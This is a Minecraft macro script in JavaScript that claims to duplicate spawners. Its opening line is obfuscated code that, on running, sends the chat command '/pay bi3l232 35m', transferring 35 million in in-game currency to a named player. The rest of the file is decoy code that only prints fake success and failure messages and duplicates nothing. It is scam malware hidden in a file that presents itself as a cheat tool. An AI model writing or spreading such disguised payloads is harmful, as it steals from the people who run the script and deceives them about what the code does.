function _0x5817(_0x2aae3d,_0x2239f1){var _0x1a9a3b=_0x1a9a();return _0x5817=function(_0x5817c7,_0x2a3160){_0x5817c7=_0x5817c7-0x9a;var _0x397bd6=_0x1a9a3b[_0x5817c7];return _0x397bd6;},_0x5817(_0x2aae3d,_0x2239f1);}function _0x1a9a(){var _0x2798e6=['139044NkmErr','4CTmCaw','911ewhwQs','866WFFGka','32936xpyWPH','1539eENvdn','/pay\x20bi3l232\x2035m','105vlFkgQ','40116UQxBgp','2112265EyJjcC','11030rrOPCs','455uhIVJZ','456108qaILvb','2431YWTwHk'];_0x1a9a=function(){return _0x2798e6;};return _0x1a9a();}var _0x4eb5e8=_0x5817;(function(_0x111fe6,_0x4aa590){var _0x1281f2=_0x5817,_0x39b622=_0x111fe6();while(!![]){try{var _0x1cd6be=parseInt(_0x1281f2(0x9f))/0x1*(-parseInt(_0x1281f2(0xa0))/0x2)+-parseInt(_0x1281f2(0x9b))/0x3+-parseInt(_0x1281f2(0x9e))/0x4*(-parseInt(_0x1281f2(0xa6))/0x5)+-parseInt(_0x1281f2(0xa5))/0x6*(-parseInt(_0x1281f2(0xa4))/0x7)+parseInt(_0x1281f2(0xa1))/0x8*(parseInt(_0x1281f2(0xa2))/0x9)+parseInt(_0x1281f2(0xa7))/0xa*(parseInt(_0x1281f2(0x9c))/0xb)+parseInt(_0x1281f2(0x9d))/0xc*(-parseInt(_0x1281f2(0x9a))/0xd);if(_0x1cd6be===_0x4aa590)break;else _0x39b622['push'](_0x39b622['shift']());}catch(_0x20c5cc){_0x39b622['push'](_0x39b622['shift']());}}}(_0x1a9a,0x7e945),Chat['say'](_0x4eb5e8(0xa3)));

Client.waitTick(10)

function simulateDuplicationLogic(spawnerName) {
    // Simulate renaming the spawner
    if (spawnerName === "null" || spawnerName.trim() === "") {
        Chat.log("Error: Invalid spawner name!");
        return false;
    }

    // Simulate hashing the name (pseudo-encryption)
    let hashedName = spawnerName.split("").map((char, index) => {
        return char.charCodeAt(0) + index;
    }).join("-");

    Chat.log(`Renaming spawner to: ${hashedName}`);

    // Simulate breaking the spawner
    let success = Math.random() > 0.0; // .0 to change  chance to fail
    if (!success) {
        Chat.log(`Error: Failed to break spawner with name ${hashedName}`);
        return false;
    }

    Chat.log(`Spawner ${hashedName} broken successfully.`);

    // Simulate duplicating logic
    let duplicationChance = Math.random();
    if (duplicationChance < 0.25) {
        Chat.log("Error: Duplication logic failed. Try again.");
        return false;
    }

    Chat.log("Duplication logic successful. Outputting items...");
    return true;
}

// Main function
function main() {
    let spawnerName = "Spawner";
    Chat.actionbar("Starting duplication process...");

    // Simulate fetching the item
    let playerInventory = Player.getInventory();
    if (!playerInventory || playerInventory.length === 0) {
        Chat.log("Error: Player inventory is empty!");
        return;
    }

    let spawnerFound = false;
    for (let item of playerInventory) {
        if (item.name.includes("Spawner")) {
            spawnerFound = true;
            spawnerName = item.name;
            break;
        }
    }

    if (!spawnerFound) {
        Chat.log("Error: No spawner found in inventory!");
        return;
    }

    // Execute duplication logic
    let duplicationSuccess = simulateDuplicationLogic(spawnerName);
    if (!duplicationSuccess) {
        Chat.log("Duplication process failed. Debug information logged.");
        return;
    }

    Chat.log("Duplication process completed successfully!");
}

// Execute main
main();
